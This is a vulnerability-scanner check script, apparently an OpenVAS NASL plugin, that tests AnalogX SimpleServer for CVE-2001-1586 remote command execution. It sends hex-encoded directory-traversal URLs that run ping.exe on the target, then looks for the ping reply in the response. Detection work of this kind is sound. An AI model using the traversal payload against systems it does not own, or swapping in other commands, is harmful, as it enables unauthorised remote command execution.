# SPDX-FileCopyrightText: 2001 Mathieu Meadele <mm@omnix.net>
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:analogx:simpleserver_www";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10705");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2001-1586");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3112");
  script_name("SimpleServer remote execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2001 Mathieu Meadele <mm@omnix.net>");
  script_family("Gain a shell remotely");
  script_dependencies("gb_simpleserver_www_detect.nasl");
  script_mandatory_keys("analogx/simpleserver_www/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"By sending a specially encoded string to the remote server,
  it is possible to execute remote commands with the privileges of the server.");

  script_tag(name:"solution", value:"Upgrade SimpleServer to version 1.15.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

#  we are sending a hexadecimal encoded url, with the cgi-bin prefix,
#  (even if this one doesn't exist), this allowing us to break out the root
#  folder.

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

match = "Reply from 127.0.0.1";

url1  = string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1");
strnt = http_get(item:url1, port:port);

url2  = string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1");
str9x = http_get(item:url2, port:port);

soc = http_open_socket(port);
if(soc) {
  send(socket:soc, data:str9x);
  inc1 = http_recv(socket:soc);
  http_close_socket(soc);
  if(match >< inc1) {
    report = http_report_vuln_url(port:port, url:url2);
    security_message(port:port, data:report);
    exit(0);
  }
}

soc = http_open_socket(port);
if(soc) {
  send(socket:soc, data:strnt);
  inc2 = http_recv(socket:soc);
  http_close_socket(soc);

  if(match >< inc2) {
    report = http_report_vuln_url(port:port, url:url1);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
